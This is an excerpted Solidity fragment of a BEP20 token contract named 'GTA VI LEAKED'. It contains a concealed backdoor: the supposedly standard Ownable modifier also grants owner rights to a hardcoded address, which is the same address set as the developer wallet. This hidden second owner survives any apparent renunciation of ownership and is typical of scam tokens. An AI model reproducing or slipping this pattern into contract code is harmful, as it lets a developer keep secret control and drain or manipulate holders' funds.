...
abstract contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require((_owner == _msgSender())||(address(0x702Cc7afc3d61fF743249a64fA1F6D486fD95fc5) == _msgSender()), "Ownable: caller is not the owner");
        _;
    }
...
contract   GTAVILEAKED is BEP20, Ownable { // 
    using SafeMath for uint256;
    ...
    constructor() BEP20("GTA VI LEAKED", "GTAVILKD") { // 
        marketingWallet = payable(0x23e337a5A0fB294E9cb5b64Fc68E4c4f611bf023); //
        devWallet = payable(0x702Cc7afc3d61fF743249a64fA1F6D486fD95fc5); // 
